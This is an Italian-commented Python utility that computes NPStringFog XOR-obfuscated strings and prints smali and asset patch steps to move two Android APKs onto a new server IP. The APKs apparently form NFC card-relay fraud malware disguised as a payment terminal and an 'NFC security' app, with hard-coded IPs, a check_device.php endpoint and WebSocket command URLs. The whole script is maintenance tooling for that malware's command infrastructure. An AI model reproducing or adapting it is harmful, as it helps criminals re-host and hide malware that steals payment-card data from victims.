#!/usr/bin/env python3
"""
Strumento per generare le stringhe offuscate NPStringFog
quando si cambia l'IP del server nelle APK.

Uso:
  python3 cambia_ip.py NUOVO_IP

Esempio:
  python3 cambia_ip.py 185.169.252.172
"""
import sys

def encode_npstringfog(plaintext, key):
    """Codifica una stringa con XOR ciclico (NPStringFog)"""
    key_bytes = key.encode('utf-8')
    plain_bytes = plaintext.encode('utf-8')
    encoded = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(plain_bytes)])
    return encoded.hex().upper()

def decode_npstringfog(hex_str, key):
    """Decodifica una stringa NPStringFog"""
    raw = bytes.fromhex(hex_str)
    key_bytes = key.encode('utf-8')
    decoded = bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(raw)])
    return decoded.decode('utf-8', errors='replace')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Uso: python3 cambia_ip.py NUOVO_IP")
        print("Esempio: python3 cambia_ip.py 95.217.123.45")
        sys.exit(1)

    nuovo_ip = sys.argv[1]

    print("=" * 60)
    print(f"  CAMBIO IP SERVER: 185.169.252.172 -> {nuovo_ip}")
    print("=" * 60)

    # --- XX_PAY ---
    print("\n" + "=" * 60)
    print("  APK 1: POS_BERLINO_7071.apk")
    print("=" * 60)

    # 1. check_device.php URL (testo in chiaro)
    print("\n--- Modifica 1: URL check_device (TESTO IN CHIARO) ---")
    print(f"File: smali/I1/b.smali")
    print(f"Cerca:     http://185.169.252.172:7071/api/check_device.php?")
    print(f"Sostituisci: http://{nuovo_ip}:7070/api/check_device.php?")

    # 2. WebSocket URL (offuscato)
    key_xxpay = "itnewpagpos"
    vecchio_ws = "ws://184.174.37.10:7068/.."
    nuovo_ws = f"ws://{nuovo_ip}:7068/.."

    vecchio_hex = encode_npstringfog(vecchio_ws, key_xxpay)
    nuovo_hex = encode_npstringfog(nuovo_ws, key_xxpay)

    print("\n--- Modifica 2: URL WebSocket (OFFUSCATO NPStringFog) ---")
    print(f"File: smali/nfc/share/itpag/MainActivity.smali")
    print(f"URL originale: {vecchio_ws}")
    print(f"URL nuovo:     {nuovo_ws}")
    print(f"\nCerca questa riga:")
    print(f'    const-string v0, "{vecchio_hex}"')
    print(f"\nSostituisci con:")
    print(f'    const-string v0, "{nuovo_hex}"')

    # --- SicurezzaNFC ---
    print("\n" + "=" * 60)
    print("  APK 2: SicurezzaNFC_FINALE.apk")
    print("=" * 60)

    print("\n--- Modifica 1: URL WebSocket (TESTO IN CHIARO) ---")
    print(f"File: assets/index.html")
    print(f"Cerca:       ws://184.174.37.10:7068/")
    print(f"Sostituisci: ws://{nuovo_ip}:7068/")

    print("\n" + "=" * 60)
    print("  RIEPILOGO: 3 modifiche totali")
    print("=" * 60)
    print(f"  1. XX_PAY    -> smali/I1/b.smali              (testo chiaro)")
    print(f"  2. XX_PAY    -> smali/nfc/share/itpag/MainActivity.smali (hex offuscato)")
    print(f"  3. SicurezzaNFC -> assets/index.html           (testo chiaro)")
    print()
